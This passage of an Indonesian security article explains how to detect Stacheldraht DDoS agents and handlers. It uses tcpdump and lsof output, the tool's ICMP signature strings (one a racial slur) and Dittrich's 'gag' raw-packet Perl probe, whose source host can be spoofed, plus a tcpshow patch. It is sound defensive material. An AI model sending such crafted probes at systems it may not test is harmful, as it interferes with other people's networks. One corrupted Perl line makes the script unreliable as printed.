+ . . .
+------------------------------------------------------------------------------
+
+Untuk melihat daftar system yang mengembalikan paket ICMP_ECHOREPLY dengan ID 669, 
+lakukan yang berikut ini :
+
+
+------------------------------------------------------------------------------
+# tcpdump -r stach.dump
+tcpdump: Filtering in user process
+15:27:57.520094 192.168.0.1 > 10.0.0.1: icmp: echo reply (DF)
+15:28:01.984660 192.168.2.10 > 10.0.0.1: icmp: echo reply (DF)
+------------------------------------------------------------------------------
+
+
+Untuk benar-benar memastikan bahwa muatan paket tersebut terdapat konfirmasi " sicken\n", 
+anda dapat melakukan hal yang berikut ini:
+
+
+------------------------------------------------------------------------------
+# tcpshow < stach.dump | egrep "Source IP|sicken"
+tcpdump: Filtering in user process
+        Source IP Address:              198.162.0.1
+        ....................sicken
+        Source IP Address:              192.168.2.10
+        ....................sicken
+------------------------------------------------------------------------------
+
+
+{Apabila anda membutuhkan sebuah tool untuk mendeteksi stacheldraht, trinoo ataupun tfn. 
+Anda bisa menemukannya di: http://staff.washington.edu/dittrich/misc/ddos_scan.tar}
+
+String-string seperti "Skillz", "spoofworks", "sicken\n", "niggahbitch", dan "ficken"
+semua dikirim melalui segmen data ICMP—string-string tersebut tidak di encrypted, maka 
+akan terlihat pada bagian data dari paket ICMP_ECHOREPLY. ID value 666, 667, 668, 669, 
+dan 1000 akan  mudah juga untuk diidentifikasi di dalam packet flow (arus paket) 
+menggunakan " ngrep", atau metoda lain  di atas.
+
+Apabila menggunakan “lsoft” Lsof adalah suatu alat diagnostik Unix-specific.
+LSof=List Open Files. Untuk menemukan daftar-daftar informasi tentang file 
+(file apapun juga) yang terbuka oleh proses yang berjalan pada sistem. Juga dapat 
+melihat daftar komunikasi yang terbuka oleh masing-masing proses. maka 
+stacheldraht handler dapat terlihat di dalam system seperti ini :
+
+------------------------------------------------------------------------------
+# lsof -c mserv
+COMMAND  PID USER   FD   TYPE DEVICE    SIZE  NODE NAME
+mserv   1072 root  cwd    DIR    3,3    2048 40961 /tmp/...
+mserv   1072 root  rtd    DIR    3,3    1024     2 /
+mserv   1072 root  txt    REG    3,3   50506 41421 /tmp/.../mserv
+mserv   1072 root  mem    REG    3,3  342206 30722 /lib/ld-2.1.1.so
+mserv   1072 root  mem    REG    3,3   63878 30731 /lib/libcrypt-2.1.1.so
+mserv   1072 root  mem    REG    3,3 4016683 30729 /lib/libc-2.1.1.so
+mserv   1072 root    0u   CHR  136,4             6 /dev/pts/4
+mserv   1072 root    1u   CHR  136,4             6 /dev/pts/4
+mserv   1072 root    2u   CHR  136,4             6 /dev/pts/4
+mserv   1072 root    3u  sock    0,0          2143 can't identify protocol
+mserv   1073 root  cwd    DIR    3,3    2048 40961 /tmp/...
+mserv   1073 root  rtd    DIR    3,3    1024     2 /
+mserv   1073 root  txt    REG    3,3   50506 41421 /tmp/.../mserv
+mserv   1073 root  mem    REG    3,3  342206 30722 /lib/ld-2.1.1.so
+mserv   1073 root  mem    REG    3,3   63878 30731 /lib/libcrypt-2.1.1.so
+mserv   1073 root  mem    REG    3,3 4016683 30729 /lib/libc-2.1.1.so
+mserv   1073 root    0u   CHR  136,4             6 /dev/pts/4
+mserv   1073 root    1u   CHR  136,4             6 /dev/pts/4
+mserv   1073 root    2u   CHR  136,4             6 /dev/pts/4
+mserv   1073 root    3u  inet   2144           TCP *:16660 (LISTEN)
+mserv   1088 root  cwd    DIR    3,3    2048 40961 /tmp/...
+mserv   1088 root  rtd    DIR    3,3    1024     2 /
+mserv   1088 root  txt    REG    3,3   50506 41421 /tmp/.../mserv
+mserv   1088 root  mem    REG    3,3  342206 30722 /lib/ld-2.1.1.so
+mserv   1088 root  mem    REG    3,3   63878 30731 /lib/libcrypt-2.1.1.so
+mserv   1088 root  mem    REG    3,3 4016683 30729 /lib/libc-2.1.1.so
+mserv   1088 root    0u   CHR  136,4             6 /dev/pts/4
+mserv   1088 root    1u   CHR  136,4             6 /dev/pts/4
+mserv   1088 root    2u   CHR  136,4             6 /dev/pts/4
+mserv   1088 root    3r  FIFO    0,0          2227 pipe
+mserv   1088 root    5w  FIFO    0,0          2227 pipe
+mserv   1091 root  cwd    DIR    3,3    2048 40961 /tmp/...
+mserv   1091 root  rtd    DIR    3,3    1024     2 /
+mserv   1091 root  txt    REG    3,3   50506 41421 /tmp/.../mserv
+mserv   1091 root  mem    REG    3,3  342206 30722 /lib/ld-2.1.1.so
+mserv   1091 root  mem    REG    3,3   63878 30731 /lib/libcrypt-2.1.1.so
+mserv   1091 root  mem    REG    3,3 4016683 30729 /lib/libc-2.1.1.so
+mserv   1091 root    0u   CHR  136,4             6 /dev/pts/4
+mserv   1091 root    1u   CHR  136,4             6 /dev/pts/4
+mserv   1091 root    2u   CHR  136,4             6 /dev/pts/4
+mserv   1091 root    3r  FIFO    0,0          2240 pipe
+mserv   1091 root    4u  inet   2215           TCP
+192.168.0.1:16660->10.0.0.1:1029 (ESTABLISHED)
+mserv   1091 root    5w  FIFO    0,0          2240 pipe
+------------------------------------------------------------------------------
+
+
+Agent akan terlihat seperti ini:
+
+
+------------------------------------------------------------------------------
+# lsof -c ttymon
+COMMAND PID USER   FD   TYPE DEVICE    SIZE  NODE NAME
+ttymon  437 root  cwd    DIR    3,1    1024 37208 /usr/lib/libx/...
+ttymon  437 root  rtd    DIR    3,1    1024     2 /
+ttymon  437 root  txt    REG    3,1  324436 37112 /usr/lib/libx/.../ttymon
+ttymon  437 root  mem    REG    3,1  243964 29140 /lib/libnss_files-2.1.1.so
+ttymon  437 root  mem    REG    3,1 4016683 29115 /lib/libc-2.1.1.so
+ttymon  437 root  mem    REG    3,1  342206 28976 /lib/ld-2.1.1.so
+ttymon  437 root    3u  sock    0,0           779 can't identify protocol
+ttymon  449 root  cwd    DIR    3,1    1024 37208 /usr/lib/libx/...
+ttymon  449 root  rtd    DIR    3,1    1024     2 /
+ttymon  449 root  txt    REG    3,1  324436 37112 /usr/lib/libx/.../ttymon
+ttymon  449 root    0u  inet    811           TCP *:32222 (LISTEN)
+ttymon  449 root    3u  sock    0,0           779 can't identify protocol
+------------------------------------------------------------------------------
+
+
+Pertahanan
+
+
+Karena  program menggunakan paket ICMP_ECHOREPLY untuk komunikasinya, maka akan 
+sangat sulit (jika tidak mustahil) untuk menghalanginya tanpa mematahkan program 
+Internet yang bersandar pada ICMP. Dalam Phrack magazine disebutkan :
+
+	“The only sure way to destroy this channel is to deny ALL
+	ICMP_ECHO traffic into your network”
+
+Salah satu jalan dalam pertahanan yang real adalah selalu meng-up to date * semua * 
+system dengan security patches, services yang tidak perlu dimatikan, dan administrator 
+sistem berkompeten  untuk menjalankan dan memonitoring tiap-tiap sistem Unix pada 
+network-nya. (“stacheldrahter” akan menahan nafas panjang kalo semua sysadmin 
+ngelakuin itu, OK?…………..:). 
+
+
+Sebenarnya artikel tentang stacheldraht ini belum sepenuhnya saya bahas (di antaranya 
+yang belum saya bahas adalah ; tentang kelemahan Stacheldraht dan tentang tahap-tahap 
+evolusi selanjutnya yang akan terjadi pada tools DDos+++dilain waktu akan saya bahas
+Udah dulu yah…lagi pegel nih….kapan2 sambung lagi…(aRTiKeL YaNg SeLAnJUtnya aKaN OguT 
+PubLikaSikAn aDaLah CARA INSTALLASI TRINOO NETWORK, TFN, TFN2K, dll. 
+
+
+A. “Gag” Perl Script yang digunakan untuk mendeteksi Stacheldraht Agen :
+
+
+-------------------------------  potong disini  -----------------------------------
+#!/usr/bin/perl
+#
+# gag v. 1.0
+# By Dave Dittrich 
+# 
+# Send an ICMP_ECHOREPLY packet with ID of 668 to a stacheldraht
+# agent, causing it to reply to the sending host with an
+# ICMP_ECHOREPLY packet with an ID of 669 and the string "sicken\n"
+# in the data field of the packet.  Watch for this with tcpdump,
+# ngrep, sniffit, etc., e.g.:
+#
+#	# tcpdump -s 1500 -w stach.dump 'icmp[4:2] = 669'
+#	# tcpshow < stach.dump
+#  or
+#       # ngrep -x '*' 'icmp[4:2] = 669'
+#
+# Needs Net::RawIP (http://quake.skif.net/RawIP)
+# Requires libpcap (ftp://ftp.ee.lbl.gov/libpcap.tar.Z)
+#
+# Example: ./gag [options] iplist
+#
+# (This code was hacked from the "macof" program, written by
+# Ian Vitek )
+
+require 'getopts.pl';
+use Net::RawIP;
+require 'netinet/in.ph';
+
+$a = new Net::RawIP({icmp => {}});
+chop($hostname = `hostname`);
+
+Getopts('a:c:f:i:vh');
+die "usage: $0 [options] iplist\
+\t-a arg\t\tSend command argument 'arg' (default \"gesundheit!\")\
+\t-c val\t\tSend command value 'val' (default 668 - ID_TEST)\
+\t-f from_host\t\t(default:$hostname)\
+\t-i interface \t\tSet sending interface (default:eth0)\
+\t-v\t\t\tVerbose\
+\t-h This help\n" unless ( !$opt_h );
+
+# set default values
+$opt_i = ($opt_i) ? $opt_i : "eth0";
+$opt_a = ($opt_a) ? $opt_a : "gesundheit!";
+$opt_c = ($opt_c) ? $opt_c : "668";
+
+# choose network card
+if($opt_e) {
+  $a->ethnew($opt_i, dest => $opt_e);
+} else {
+  $a->ethnew($opt_i);
+}
+
+$s_host = ($opt_f) ? $opt_f : $hostname;
+
+if ($ARGV[0]) {
+  open(I,") {
+    chop;
+    push(@list,$_);
+  }
+  close(I);
+}
+
+# Put value in network byte order (couldn't get htons() in
+# "netinet/in.ph" to work. Go figure.)
+$id = unpack("S", pack("n", $opt_c));
+
+foreach $d_host (@list) {
+  $a->set({ip => {saddr => $s_host, daddr => $d_host},
+           icmp => {type => 0, id => $id, data => $opt_a}
+          });
+  print "sending packet [$opt_c/\"$opt_a\"] to $d_host\n" if $opt_v;
+  $a->send;
+}
+
+exit(0);
+------------------------------- potong disini -----------------------------------
+
+
+B. Patches tcpshow 1. 0,  untuk display ICMP ECHO id/seq :
+
+
+
+----------------------------------------------------------------------
+
+diff -c tcpshow/tcpshow.c tcpshow.orig/tcpshow.c
+*** tcpshow/tcpshow.c	Mon Dec 27 16:21:54 1999
+--- tcpshow.orig/tcpshow.c	Thu Oct 21 14:12:19 1999
+***************
+*** 1081,1088 ****
+     uint2 nskipped;
+     uint1 type;
+     char *why;
+-    uint2 echo_id;
+-    uint2 echo_seq;
+  
+  
+     type = getbyte(&pkt);  nskipped  = sizeof(type);
+--- 1081,1086 ----
+***************
+*** 1093,1103 ****
+     /* Must calculate it from the size of the IP datagram - the IP header.*/
+     datalen -= ICMPHDRLEN;
+  
+-    if (type == ECHO_REQ || type == ECHO_REPLY) {
+-       echo_id = getword(&pkt); nskipped += sizeof(cksum);
+-       echo_seq = getword(&pkt); nskipped += sizeof(cksum);
+-    }
+- 
+     why = icmpcode(type, code);
+     if (dataflag) {
+        printf(
+--- 1091,1096 ----
+***************
+*** 1120,1129 ****
+  	 icmptype(type), why? "\n\tBecause:\t\t\t": "", why? why: ""
+        );
+        printf("\tChecksum:\t\t\t0x%04X\n", cksum);
+-       if (type == ECHO_REQ || type == ECHO_REPLY) {
+-          printf("\tId:\t\t\t\t0x%04X (%d)\n", echo_id, echo_id);
+-          printf("\tSequence:\t\t\t0x%04X (%d)\n", ntohs(echo_seq), ntohs(echo_seq));
+-       }
+     }
+  
+     return pkt;
+--- 1113,1118 ----
+***************
+*** 1194,1200 ****
+        printf("\tVersion:\t\t\t4\n\tHeader Length:\t\t\t%d bytes\n", hlen);
+        printf("\tService Type:\t\t\t0x%02X\n", (uint2)servtype);
+        printf("\tDatagram Length:\t\t%d bytes\n", dgramlen);
+!       printf("\tIdentification:\t\t\t0x%04X (%d)\n", id, id);
+        printf(
+  	 "\tFlags:\t\t\t\tMF=%s DF=%s\n",
+  	 (flags & MF) == MF? on: off, (flags & DF) == DF? on_e: off_e
+--- 1183,1189 ----
+        printf("\tVersion:\t\t\t4\n\tHeader Length:\t\t\t%d bytes\n", hlen);
+        printf("\tService Type:\t\t\t0x%02X\n", (uint2)servtype);
+        printf("\tDatagram Length:\t\t%d bytes\n", dgramlen);
+!       printf("\tIdentification:\t\t\t0x%04X\n", id);
+        printf(
+  	 "\tFlags:\t\t\t\tMF=%s DF=%s\n",
+  	 (flags & MF) == MF? on: off, (flags & DF) == DF? on_e: off_e
+
+
+----------------------------------------------------------------------
+
+
+C. Referensi :
+
+David Dittrich. 
+	http://staff.washington.edu/dittrich/
+
+The "Tribe Flood Network" distributed denial of service attack tool
+	http://staff.washington.edu/dittrich/misc/tfn.analysis
+
+The DoS Project's "trinoo" distributed denial of service attack tool
+	http://staff.washington.edu/dittrich/misc/trinoo.analysis
+
+R. Wright., Addison-Wesley.
+	TCP/IP Illustrated, Vol. I, II, and III. W. Richard Stevens and Gary
+
+Distributed denial of service attack tools at Packet Storm Security
+	http://packetstorm.securify.com/distributed/
+
+CERT Distributed System Intruder Tools Workshop report
+	http://www.cert.org/reports/dsit_workshop.pdf
+
+CERT Advisory CA-99-17 Denial-of-Service Tools
+	http://www.cert.org/advisories/CA-99-17-denial-of-service-tools.html
+
+ngrep:
+	http://www.packetfactory.net/ngrep/
+
+tcpdump:
+	ftp://ftp.ee.lbl.gov/tcpdump.tar.Z
+
+tcpshow:
+	http://packetstorm.securify.com/linux/trinux/src/tcpshow.c
+
+sniffit:
+	http://sniffit.rug.ac.be/sniffit/sniffit.html
+
+
+Net::RawIP:
+	http://quake.skif.net/RawIP
+
+loki client/server:
+	Phrack Magazine, Volume Seven, Issue Forty-Nine,
+	File 06 of 16, [ Project Loki ]
+	http://www.phrack.com/
+
+	Phrack Magazine  Volume 7, Issue 51 September 01, 1997,
+	article 06 of 17 [ L O K I  2   (the implementation) ]
+	http://www.phrack.com/
+
+libnet:
+	http://www.packetfactory.net/libnet
+
+
+D. thanx’s  to :
+
+
+
+Senyumnet Company:
+Topan, Evan, Zipel, Wiwit, Riko, Tyo, Abang Afudz, dll. 
+(sorry,…that’s your  real name..!!???)
+
+Nixxxer_overrun (japan):
+Thank’s for your advices and allow me to use your network….(I guess you must 
+change your script, it’s very disturbing me…ain’t “child” sucker…!!!!J)
+
+
+
+
+Kirim kritik dan saran ke : hilman_hands@yahoo.com
